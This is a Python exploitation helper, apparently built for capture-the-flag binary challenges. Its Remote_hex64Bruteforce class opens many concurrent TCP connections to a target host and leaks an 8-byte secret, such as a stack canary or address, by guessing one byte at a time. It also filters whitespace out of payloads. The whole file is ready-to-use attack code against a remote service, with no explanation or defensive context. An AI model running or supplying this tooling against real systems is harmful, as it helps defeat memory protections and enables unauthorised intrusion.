from struct import pack, unpack
from concurrent.futures import ThreadPoolExecutor
import socket

to_bytes = lambda x: pack("Q", x)
from_bytes = lambda x: unpack("Q", x)[0]

# also checks for newline
def check_whitespaces(payload):

    whitespaces = [b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x20', b'\x85', b'\xa0', b'\n']
    for c in whitespaces:
        if c in payload:
            raise RuntimeError(f"Whitespace character {c} detected in payload; terminating\n")

class Remote_hex64Bruteforce:

    PAD_BYTE = b'A'

    def __log_info(self, msg):

        if self.print_log is True:
            print(f"[i] [{self.session_name}] {msg}")

    def __log_warning(self, msg):

        if self.print_log is True:
            print(f"[!] [{self.session_name}] {msg}")

    def __log_success(self, msg):

        if self.print_log is True:
            print(f"[*] [{self.session_name}] {msg}")

    #
    # hits should be a dictionary of the form {byte from [0, 7]: [(lo0, hi0), (lo1, hi1), ...]}
    # where each pair (lo_i, hi_i) indicates a closed interval of values to be tried for that particular byte
    # an interval of the form (val, val) indicates thet only one value (val) should be tried
    # if hits is none, every possible value is tried for every byte
    #
    # byte_check_function(socket, byte_value_to_try, payload_prefix) -> byte (if ok) / None (if not ok)
    def __init__(self, target_ipv4, target_port, byte_check_function, prefix_len, max_thrcnt=32, hints=None, print_log=True, session_name=None):
        
        self.TARGET_IP = target_ipv4
        self.TARGET_PORT = target_port

        # dictionary of the same form as hits
        self.buteforce_intervals = {}

        if hints is None:
            self.buteforce_intervals = {byte: [(b'\x00', b'\xff')] for byte in range(8)}
        else:
            self.buteforce_intervals = hints
            for b in range(8):
                if b not in self.buteforce_intervals.keys():
                    self.buteforce_intervals.update({b: [(b'\x00', b'\xff')]})

        self.max_thrcnt = max_thrcnt
        
        self.prefix = Remote_hex64Bruteforce.PAD_BYTE * prefix_len
        self.leaked = b''

        self.__try_val = byte_check_function
        
        self.print_log = print_log
        self.session_name = session_name

    def __bruteforce_values(self, byte):

        b_hints = self.buteforce_intervals[byte]

        for lo_b, hi_b in b_hints:

            lo = int.from_bytes(lo_b, 'little')
            hi = int.from_bytes(hi_b, 'little')

            for val in range(lo, hi + 1):
                yield val.to_bytes(1, 'little')

    def __bytewise_bruteforce(self, byte):

        tests = []
        
        with ThreadPoolExecutor(self.max_thrcnt) as threadpool:

            for byte_val in self.__bruteforce_values(byte):

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.TARGET_IP, self.TARGET_PORT))
            
                tests.append(threadpool.submit(self.__try_val, sock, byte_val, self.prefix + self.leaked))

            for t in tests:
                
                ok_byte = t.result()
                if ok_byte is not None:
                    
                    self.__log_success(f"Byte {byte} found: {ok_byte}")

                    self.leaked += ok_byte
                    return

            self.__log_warning(f"Could not find any accepted value for byte {byte}; terminating")
            quit()


    def find_value(self):

        self.__log_info(f"Starting bruteforce on {self.TARGET_IP}:{self.TARGET_PORT}...")

        for b in range(8):
            self.__bytewise_bruteforce(b)

        self.__log_success(f"Value leaked: {self.leaked}")
        return self.leaked

    